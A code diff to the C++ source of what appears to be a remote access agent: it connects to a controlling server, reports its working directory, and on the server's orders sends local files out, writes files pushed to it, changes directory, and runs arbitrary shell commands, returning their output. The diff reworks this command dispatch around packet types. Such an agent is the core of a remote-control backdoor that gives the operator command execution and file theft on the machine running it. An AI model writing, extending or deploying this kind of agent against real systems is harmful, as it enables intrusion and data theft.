@@ -3,9 +3,8 @@
 void Agent::OnConnect(Connection connection)
 {
 	Packet packet;
-	std::filesystem::path path = std::filesystem::current_path();
 
-	packet.InsertString(path.string() + ">");
+	packet.InsertString(command.GetCurrentDir());
 	connection.Send(packet);
 }
 
@@ -30,50 +29,81 @@ bool Agent::Logic()
 		return false;
 	}
 
+	PacketType packetType = packet.GetPacketType();
+
+	// shutdown if connectionClose recevied.
+	if (packetType == PacketType::ConnectionClose)
+		return false;
+
 	std::string cmd = packet.ExtractString();
 
-	if (cmd.rfind("AgentDown", 0) == 0)
+	// send file request
+	if (packetType == PacketType::Integers)
 	{
-		std::cout << "[+] Shutting down agent..." << std::endl;
-		return false;
-	}
+		std::string& filename = cmd;
 
-	else if (cmd.rfind("cd ", 0) == 0)
-	{
-		if (not command.SetCurrentPath(cmd))
+		// check if file exists
+		if (std::filesystem::exists(filename))
 		{
-			std::string pathErr = "The system cannot find the path specified.";
-			packet.Clear();
-			packet.InsertString(pathErr);
-
-			if (not serverConn.Send(packet))
+			// send the file
+			if (not serverConn.SendFile(filename))
 			{
-				std::cerr << "Error at Send (path error)." << std::endl;
+				std::cerr << "Error at SendFile" << std::endl;
 				return false;
 			}
-		}
-	}
 
-	else if (cmd.rfind("Download ", 0) == 0)
-	{
-		std::string filename = cmd.substr(cmd.find(' ') + 1);
-		
-		if (not serverConn.SendFile(filename))
+			// exit the function since we sent the file
+			return true;
+		}
+
+		else
 		{
-			std::cerr << "Error at Sendfile." << std::endl;
-			return false;
+			//clear the paccket and set packet type to invalid since file does not exist
+			packet.Clear();
 		}
+
 	}
 
-	else if (cmd.rfind("Upload ", 0) == 0)
+	// file receive request
+	else if (packetType == PacketType::Bytes)
 	{
-		if (not serverConn.RecvFile())
+		std::string& filename = cmd;
+		uint32_t filesize = packet.ExtractInt();
+
+		// receive file
+		if (not serverConn.RecvFile(filename, filesize))
 		{
 			std::cerr << "Error at RecvFile." << std::endl;
 			return false;
 		}
+
+		// exit the function since we received the file
+		return true;
+	}
+	
+
+	// change current dir
+	else if (packetType == PacketType::Pwd)
+	{
+
+		std::string newPath = cmd.substr(cmd.find(' ') + 1);
+
+		if (command.SetCurrentDir(newPath))
+		{
+			packet.Clear();
+			packet.InsertString(command.GetCurrentDir() + '\n');
+		}
+
+		else
+		{
+			//clear the paccket and set packet type to invalid since the system cannot find it.
+			packet.Clear();
+			packet.InsertString(std::string("The system cannot find the path specified.\n"));
+		}
+		
 	}
 
+	// execute command line command
 	else
 	{
 		if (not command.Execute(cmd))
@@ -81,24 +111,14 @@ bool Agent::Logic()
 			std::cerr << "Error at Execute" << std::endl;
 			return false;
 		}
-		std::string cmdOutput = command.GetCmdOutput();
 
 		packet.Clear();
-		packet.InsertString(cmdOutput);
-
-		if (not serverConn.Send(packet))
-		{
-			std::cerr << "Error at Send (command output)." << std::endl;
-			return false;
-		}
+		packet.InsertString(command.GetOutput());
 	}
-	
-	packet.Clear();
-	packet.InsertString(command.GetCurrentPath());
 
 	if (not serverConn.Send(packet))
 	{
-		std::cerr << "Error at Send (pwd)." << std::endl;
+		std::cerr << "Error at Send (response)." << std::endl;
 		return false;
 	}
 
